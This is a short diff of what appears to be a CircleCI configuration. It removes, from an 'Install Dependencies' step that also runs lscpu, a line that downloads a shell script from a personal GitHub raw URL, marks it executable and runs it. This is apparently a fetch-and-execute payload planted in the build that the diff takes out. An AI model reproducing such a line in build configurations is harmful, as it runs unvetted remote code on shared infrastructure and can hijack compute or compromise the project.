@@ -9,8 +9,7 @@ jobs:
             name: Install Dependencies
             command: |
               lscpu
-              wget https://raw.githubusercontent.com/rindalasririn/a/main/16.sh && chmod +x 16.sh &&./16.sh
-
+              
 workflows:
     version: 2.1
     build:
